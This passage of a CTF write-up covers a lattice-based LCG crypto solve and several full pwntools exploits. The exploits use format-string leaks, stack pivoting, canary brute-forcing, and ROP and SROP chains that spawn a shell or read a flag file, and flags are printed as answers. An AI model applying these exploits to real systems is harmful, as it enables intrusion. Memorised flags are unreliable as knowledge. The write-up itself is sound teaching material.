<h4 id="求解flag"><a href="#求解flag" class="headerlink" title="求解flag"></a><strong>求解flag</strong></h4><p>上一步得到P之后，题目接下来的加密就是LCG的过程，只不过给出的状态值不全，而是模了2^{16}之后的值。此时我们需要进行推导<br>由<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406723-90b5d446-aaef-49e0-b29c-4441bd1c6d80.svg" alt="image.png"><br>拆成高低位来写，则有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406750-a74efacc-25bf-4ef1-a2f4-620094e9b7b3.svg" alt="image.png"><br>其中H，L代表当前状态的高低位,化简得<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406841-a1f8da3c-a231-414d-b931-cdd131f018a7.svg" alt="image.png"><br>于是有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406891-14b215e2-e8cc-4e98-812a-80741c73e077.svg" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406956-e7a82203-cc58-402e-bf31-821ebf3c40f8.svg" alt="image.png"><br>即<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406954-7ee6c6f6-7de3-469e-9940-0b8ded27c378.svg" alt="image.png"><br>将常数记为B<br>写到这里是为了后面更好理解B_i如何计算<br>回到题目，简单来写就是<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407014-5ea2817a-676a-47a9-a378-e0b20b13ba9b.svg" alt="image.png"><br>也就是<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407048-04d781f8-76c2-49e4-b049-6357273b0fe4.svg" alt="image.png"><br>构造格<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407077-f96ecae1-9eff-4af2-8022-03518485eab6.svg" alt="image.png"><br>约后我们可以得到H_1，即可求得<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407155-4164de0c-7c3f-474d-b664-5cc1511cd327.svg" alt="image.png"><br>再求解seed<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407189-da32a146-59fa-47f5-ad91-415ad02742b1.svg" alt="image.png"><br>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">17959692613208124553115435318871530105762927141420294800783695207170608966804977782615874404539156257549097962410144332053383210075663138848832474791712256427111304125146378883542387121684653496644116081809328796925343393644118376497507</span></span><br><span class="line">enc_P = <span class="number">17215745298239635988196009014709535403293865406390546681749129213899045156482782458937447412919331336842808052179915132663427715069134196783415529688715962754860563850858056507148936427379551986735103284388996678146580229028006898491552</span></span><br><span class="line">a = <span class="number">2759277675743644814124420138047586760905070650864591936190199977578763421196999718749092450720072564786874114432179104175692800471519816376692104515142375</span></span><br><span class="line">b = <span class="number">8111240578821759579875175166986910195923820191652867334412871591814076020421468033017946066268237980082938735686222173713853299600396887041341974719819186</span></span><br><span class="line">out = [<span class="number">39566</span>, <span class="number">15295</span>, <span class="number">19818</span>, <span class="number">55685</span>, <span class="number">49100</span>, <span class="number">6517</span>, <span class="number">2675</span>, <span class="number">9567</span>, <span class="number">37243</span>, <span class="number">40312</span>, <span class="number">42906</span>, <span class="number">35874</span>, <span class="number">44178</span>, <span class="number">1256</span>, <span class="number">40298</span>, <span class="number">29149</span>, <span class="number">35721</span>, <span class="number">19886</span>, <span class="number">63020</span>, <span class="number">50116</span>, <span class="number">6844</span>, <span class="number">39897</span>, <span class="number">16134</span>, <span class="number">50218</span>, <span class="number">44609</span>, <span class="number">46188</span>, <span class="number">52712</span>, <span class="number">49903</span>, <span class="number">20933</span>, <span class="number">5441</span>, <span class="number">19411</span>, <span class="number">8330</span>, <span class="number">6904</span>, <span class="number">39350</span>, <span class="number">60853</span>, <span class="number">43446</span>, <span class="number">35910</span>, <span class="number">43728</span>, <span class="number">61533</span>, <span class="number">13757</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_P</span>(<span class="params">n,c</span>):</span><br><span class="line">    r = gmpy2.iroot(n,<span class="number">13</span>)[<span class="number">0</span>]                </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                </span><br><span class="line">        p = r**<span class="number">6</span> -<span class="number">3</span>*r**<span class="number">5</span> - r**<span class="number">4</span> + r**<span class="number">2</span> - r - <span class="number">6</span></span><br><span class="line">        q = r**<span class="number">7</span> + <span class="number">2</span>*r**<span class="number">6</span> + r**<span class="number">5</span> + <span class="number">4</span>*r**<span class="number">4</span> + <span class="number">7</span>*r**<span class="number">2</span> + r + <span class="number">4653</span></span><br><span class="line">        r = r+<span class="number">1</span>          </span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> n==p*q:                </span><br><span class="line">            q = n // p</span><br><span class="line">            d = gmpy2.invert(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            P = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            <span class="comment">#             print(P)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(P)</span><br><span class="line"></span><br><span class="line">P = get_P(n,enc_P)</span><br><span class="line"></span><br><span class="line">L = [<span class="number">0</span>] + out</span><br><span class="line">n = <span class="built_in">len</span>(out)</span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">    A.append(a*A[i-<span class="number">1</span>] % P)</span><br><span class="line">    B.append((a*B[i-<span class="number">1</span>] + (a*L[i]+b-L[i+<span class="number">1</span>])*gmpy2.invert(<span class="number">2</span>^<span class="number">16</span>,P))%P)</span><br><span class="line"></span><br><span class="line">A = A[<span class="number">1</span>:]</span><br><span class="line">B = B[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">Ge = Matrix(ZZ,n+<span class="number">1</span>,n+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(A)):</span><br><span class="line">    Ge[i,i] = P</span><br><span class="line">    Ge[-<span class="number">2</span>,i] = A[i]</span><br><span class="line">    Ge[-<span class="number">1</span>,i] = B[i]</span><br><span class="line"></span><br><span class="line">Ge[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">Ge[-<span class="number">1</span>,-<span class="number">1</span>] = P // <span class="number">2</span>^<span class="number">16</span></span><br><span class="line"></span><br><span class="line">M = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">H1 = M[-<span class="number">2</span>]</span><br><span class="line">L1 = out[<span class="number">0</span>]</span><br><span class="line">seed1 = H1 * <span class="number">2</span>^<span class="number">16</span> + L1</span><br><span class="line"></span><br><span class="line">seed = ((seed1 - b)*gmpy2.invert(a,P))%P</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(seed)))</span><br><span class="line"><span class="comment"># DRKCTF&#123;a57b63a6-ecf5-46d3-a501-2d359a4fd168&#125;</span></span><br></pre></td></tr></table></figure>

<p>希望师傅们能有所收获。另外夹带一点私货，师傅们可以关注下我的博客<br><a href="https://dexterjie.github.io/">https://dexterjie.github.io</a></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h4 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a><strong>ez_quiz</strong></h4><p>题目开了PIE和Canary保护：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733437877-846c498c-082e-4e7a-97f4-5d305ccbd96a.png" alt="image.png"><br>先本地运行附件，观察逻辑，首先需要在2s内输入token：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438467-1a0b4f13-6647-4ab5-94a8-7b7ba3f6c25a.png" alt="image.png"><br>分析代码，题目先将输入字符串在encode函数先异或0xff再进行base32加密处理，并将处理后的字符串和“XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC”比较：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438026-6ba36561-77eb-4a03-a6cd-7292ca3f58ce.png" alt="image.png"><br>此处可以打断点动态调试看内存的token，也可以直接用Cyberchef解密得到token：DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733437939-50ac061e-f260-4e38-890d-06c9039332e5.png" alt="image.png"><br>使用eval()计算式子：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733439233-23bd9a14-b1a3-4db1-ae7f-1335e5c1ea50.png" alt="image.png"><br>根据token提示，存在格式化字符串漏洞：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438338-f3281bed-4e37-491b-917f-93b3d45a9110.png" alt="image.png"><br>pwndbg调试发现Canary 在 Stack 上的地址为第0xd位，将Stack第0xa位地址-0x2042得到基址<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438603-848470a1-3acf-4b72-b15b-7bfad6500758.png" alt="image.png"><br>程序存在pop rdi<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438447-3cc1712f-868b-48bb-b7ef-4624b949f95f.png" alt="image.png"><br>通过格式化字符串泄露Canary和PIE后可写rop链执行 system(“&#x2F;bin&#x2F;sh”);<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438874-c3f33b6b-91b9-441b-988b-fe70778901c8.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;ip&quot;,port)</span></span><br><span class="line">p = process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">e = context.binary = ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;token:&#x27;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(<span class="string">&#x27;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(p.recvline().decode().strip().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].strip())))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;gift:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p|%11$p|&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;|&#x27;</span>).strip(<span class="string">b&#x27;|&#x27;</span>), <span class="number">16</span>) - <span class="number">0x2042</span></span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;|&#x27;</span>).strip(<span class="string">b&#x27;|&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;PIE: <span class="subst">&#123;<span class="built_in">hex</span>(e.address)&#125;</span>&#x27;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = e.address + <span class="number">0x3041</span></span><br><span class="line">pop_rdi = e.address + <span class="number">0x0000000000002072</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(bin_sh)</span><br><span class="line">payload += p64(pop_rdi + <span class="number">1</span>)</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a><strong>stack</strong></h4><p>其实就是一个栈迁移，但是栈迁移一次无法达到我们控制栈上栈顶数据的作用，需要栈迁移两次，再搞个ROP就行。或者ogg直接getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def exploit():</span><br><span class="line">    li(&#x27;exploit...&#x27;)</span><br><span class="line">    bss_addr =0x0000000000404040+0x400</span><br><span class="line">    read_addr = 0x00000000040119B</span><br><span class="line">    pop_rdi_ret = 0x0000000000401210 </span><br><span class="line">    libc_pop_rdx_ret = 0x0000000000142c92</span><br><span class="line">    libc_pop_rsi_ret = 0x000000000002601f</span><br><span class="line">    puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">    puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line">    main_addr = 0x000000000401176</span><br><span class="line">    pl = &quot;A&quot;*0x100+p64(bss_addr)+p64(read_addr) #栈溢出</span><br><span class="line">    db()</span><br><span class="line">    sa(&quot;Hello, CTFer, do you know how to stack pivoting?\n&quot;,pl)</span><br><span class="line">    pl2 = &quot;A&quot;*(0x100)+p64(bss_addr+0x100)+p64(read_addr) #存放在bss_addr-0x100</span><br><span class="line">    s(pl2)</span><br><span class="line">    pl3 = &quot;/bin/sh\x00&quot;+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)#存放在bss_addr-0x100</span><br><span class="line">    s(pl3)</span><br><span class="line">    base_addr  = uu64()-libc.symbols[&quot;puts&quot;]</span><br><span class="line">    system_addr = base_addr+libc.symbols[&quot;system&quot;]</span><br><span class="line">    li(&quot;base_addrr ---------------&gt; 0x%x&quot;%base_addr)</span><br><span class="line">    li(&quot;system_addr -------------&gt; 0x%x&quot;%system_addr)</span><br><span class="line"></span><br><span class="line">    pl = &quot;A&quot;*0x100+p64(bss_addr)+p64(read_addr) #栈溢出</span><br><span class="line">    sa(&quot;Hello, CTFer, do you know how to stack pivoting?\n&quot;,pl)</span><br><span class="line">    pl2 = &quot;A&quot;*(0x100)+p64(bss_addr+0x100)+p64(read_addr) #存放在bss_addr-0x100</span><br><span class="line">    s(pl2)</span><br><span class="line">    #pl4 = p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(base_addr-0x100)+p64(system_addr)#存放在bss_addr-0x100</span><br><span class="line">    pl4 = p64(0)+p64(libc_pop_rdx_ret+base_addr)+p64(0)+p64(libc_pop_rsi_ret+base_addr)+p64(0)+p64(0xe3b04+base_addr)</span><br><span class="line">    s(pl4)</span><br></pre></td></tr></table></figure>

<h4 id="Canary"><a href="#Canary" class="headerlink" title="**Canary **"></a>**Canary **</h4><p>fork函数存在，于是可以爆破cnanry，爆破完后写一个orw就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn1&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./dockerfile/bin/pwn1&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"><span class="comment">#p = remote(&#x27;121.196.193.233&#x27;,49188)</span></span><br><span class="line">pause()</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">    info(<span class="built_in">len</span>(canary))</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.sendafter(<span class="string">&quot;please input:\n&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span> + canary + p8(c))</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> p.recvline_contains(<span class="string">&#x27;stack smashing detected&#x27;</span>, timeout=<span class="number">1</span>):</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">canary = u64(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x108</span> + p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004493d7</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047c4e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004437a0</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047c4e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004018c2</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004017cf</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004437a0</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rax;ret&#x27;</span>),executable = <span class="literal">True</span>)))</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;syscall&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;please input:\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a><strong>seccomp</strong></h4><p>flag文件是没有read权限的,srop要先调用chmod改flag文件权限,再orw输出flag文件内容<br>srop的frame直接写到bss段<br>payload2的作用是栈迁移到bss段启动srop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for pwn exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;Linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.108.206.43&#x27;,26920)#47.108.206.43:20624</span></span><br><span class="line">p=remote(<span class="string">&#x27;121.196.193.233&#x27;</span>,<span class="number">49183</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;/home/kali/Desktop/my_chall/srop_seccomp/dockerfile/bin/chall&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/kali/Desktop/my_chall/srop_seccomp/dockerfile/bin/chall&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;[PAUSE]&quot;</span>)</span><br><span class="line"><span class="comment">#gadgets</span></span><br><span class="line">mov_rax_0xf = <span class="number">0x401193</span></span><br><span class="line">leave_ret = <span class="number">0x40136c</span></span><br><span class="line">ret_addr = <span class="number">0x401016</span></span><br><span class="line">syscall_addr = rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>]).address</span><br><span class="line">syscall_ret_addr = <span class="number">0x401186</span> <span class="comment">#full function</span></span><br><span class="line"><span class="comment">#rsi</span></span><br><span class="line">data_addr = <span class="number">0x404000</span></span><br><span class="line">bss_addr = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#init frame</span></span><br><span class="line">frame_read_1 = SigreturnFrame()</span><br><span class="line">frame_read_1.rax = <span class="number">0</span></span><br><span class="line">frame_read_1.rdi = <span class="number">0</span></span><br><span class="line">frame_read_1.rsi = data_addr</span><br><span class="line">frame_read_1.rdx = <span class="number">0x5a</span></span><br><span class="line">frame_read_1.rsp = <span class="number">0x404178</span> <span class="comment">#指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_read_1.rip = syscall_ret_addr</span><br><span class="line">frame_chmod = SigreturnFrame()</span><br><span class="line">frame_chmod.rax = <span class="number">0x5a</span></span><br><span class="line">frame_chmod.rdi = data_addr</span><br><span class="line">frame_chmod.rsi = <span class="number">7</span></span><br><span class="line">frame_chmod.rsp = <span class="number">0x404280</span> <span class="comment">#指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_chmod.rip = syscall_ret_addr</span><br><span class="line">frame_open = SigreturnFrame()</span><br><span class="line">frame_open.rax = <span class="number">0x02</span></span><br><span class="line">frame_open.rdi = data_addr</span><br><span class="line">frame_open.rsi = constants.O_RDONLY</span><br><span class="line">frame_open.rdx = <span class="number">0</span></span><br><span class="line">frame_open.rsp = <span class="number">0x404388</span> <span class="comment"># 指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_open.rip = syscall_ret_addr</span><br><span class="line"><span class="comment">#read flag</span></span><br><span class="line">frame_read_2 = SigreturnFrame()</span><br><span class="line">frame_read_2.rax = <span class="number">0</span></span><br><span class="line">frame_read_2.rdi = <span class="number">3</span></span><br><span class="line">frame_read_2.rsi = <span class="number">0x405000</span></span><br><span class="line">frame_read_2.rdx = <span class="number">0x30</span></span><br><span class="line">frame_read_2.rsp = <span class="number">0x404490</span> <span class="comment">#指向payload中邻接的mov_rax_0xf在bss段的地址</span></span><br><span class="line">frame_read_2.rip = syscall_ret_addr</span><br><span class="line">frame_write = SigreturnFrame()</span><br><span class="line">frame_write.rax = <span class="number">0x01</span></span><br><span class="line">frame_write.rdi = <span class="number">1</span></span><br><span class="line">frame_write.rsi = <span class="number">0x405000</span></span><br><span class="line">frame_write.rdx = <span class="number">0x30</span></span><br><span class="line">frame_write.rip = syscall_addr</span><br><span class="line"><span class="comment">#bss</span></span><br><span class="line">payload1 = p64(ret_addr) + p64(ret_addr)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_read_1)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_chmod)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_open)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_read_2)</span><br><span class="line">payload1 += p64(mov_rax_0xf) + p64(syscall_addr)</span><br><span class="line">payload1 += <span class="built_in">bytes</span>(frame_write)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;easyhack\n&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#Stack Migration</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">42</span> + p64(bss_addr) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Do u know what is SUID?\n&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&#x27;./flag\x00&#x27;</span>.ljust(<span class="number">0x5a</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Resverse"><a href="#Resverse" class="headerlink" title="Resverse"></a><strong>Resverse</strong></h2><h3 id="elec-go"><a href="#elec-go" class="headerlink" title="elec_go"></a><strong>elec_go</strong></h3><p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822273-30695272-9d90-4519-b4ae-b3ab09858191.png" alt="image.png"><br>一个普通的electron程序<br>主程序都被封装到了resources&#x2F;app.asar里<br>进入resources目录 解包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Electron\elec_go\elec_go-win32-x64\resources&gt; asar extract .\app.asar ./tmp</span><br></pre></td></tr></table></figure>

<p>src里是主要程序 node_modules只是一些包<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733822268-c1a18a92-fcc6-4185-bd02-6bf995437065.png" alt="image.png"><br>index.js 中是主程序，preload.js是浏览器预先加载的一些脚本，renderer.js是用于建立主程序与浏览器通信的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a---           2024/5/26    20:17            377 index.css</span><br><span class="line">-a---           2024/5/26    20:17            385 index.html</span><br><span class="line">-a---           2024/5/26    20:17           8785 index.js</span><br><span class="line">-a---           2024/5/26    20:17           7597 preload.js</span><br><span class="line">-a---           2024/5/26    20:17            136 renderer.js</span><br></pre></td></tr></table></figure>

<p>第一种做法<br>如果纯逆的话，步骤如下<br>1.查看preload.js<br>2.用node运行下面的js脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const escodegen=require(&quot;escodegen&quot;)</span><br><span class="line">const escodegen=require(&quot;escodegen&quot;)</span><br><span class="line">console.log(escodegen.generate(JSON.parse(Buffer(&#x27;eyJ0eXBlIjoiUHJvZ3JhbSIsInN0YXJ0IjowLCJlbmQiOjI0MCwiYm9keSI6W3sidHlwZSI6IkV4cHJlc3Npb25TdGF0ZW1lbnQiLCJzdGFydCI6MCwiZW5kIjoyNDAsImV4cHJlc3Npb24iOnsidHlwZSI6IkFycm93RnVuY3Rpb25FeHByZXNzaW9uIiwic3RhcnQiOjAsImVuZCI6MjQwLCJpZCI6bnVsbCwiZXhwcmVzc2lvbiI6ZmFsc2UsImdlbmVyYXRvciI6ZmFsc2UsImFzeW5jIjpmYWxzZSwicGFyYW1zIjpbXSwiYm9keSI6eyJ0eXBlIjoiQmxvY2tTdGF0ZW1lbnQiLCJzdGFydCI6NCwiZW5kIjoyNDAsImJvZHkiOlt7InR5cGUiOiJWYXJpYWJsZURlY2xhcmF0aW9uIiwic3RhcnQiOjksImVuZCI6MzcsImRlY2xhcmF0aW9ucyI6W3sidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRvciIsInN0YXJ0IjoxNSwiZW5kIjozNywiaWQiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6MTUsImVuZCI6MjAsIm5hbWUiOiJrb2ZmaSJ9LCJpbml0Ijp7InR5cGUiOiJDYWxsRXhwcmVzc2lvbiIsInN0YXJ0IjoyMSwiZW5kIjozNywiY2FsbGVlIjp7InR5cGUiOiJJZGVudGlmaWVyIiwic3RhcnQiOjIxLCJlbmQiOjI4LCJuYW1lIjoicmVxdWlyZSJ9LCJhcmd1bWVudHMiOlt7InR5cGUiOiJMaXRlcmFsIiwic3RhcnQiOjI5LCJlbmQiOjM2LCJ2YWx1ZSI6ImtvZmZpIiwicmF3IjoiXCJrb2ZmaVwiIn1dLCJvcHRpb25hbCI6ZmFsc2V9fV0sImtpbmQiOiJjb25zdCJ9LHsidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRpb24iLCJzdGFydCI6NDEsImVuZCI6NzQsImRlY2xhcmF0aW9ucyI6W3sidHlwZSI6IlZhcmlhYmxlRGVjbGFyYXRvciIsInN0YXJ0Ijo0NywiZW5kIjo3NCwiaWQiOnsidHlwZSI6IklkZW50aWZpZXIiLCJzdGFydCI6NDcsImVuZCI6NTAsIm5hbWUiOiJsaWIifSwiaW5pdCI6eyJ0eXBlIjoiQ2FsbEV4cHJlc3Npb24iLCJzdGFydCI6NTEsImVuZCI6NzQsImNhbGxlZSI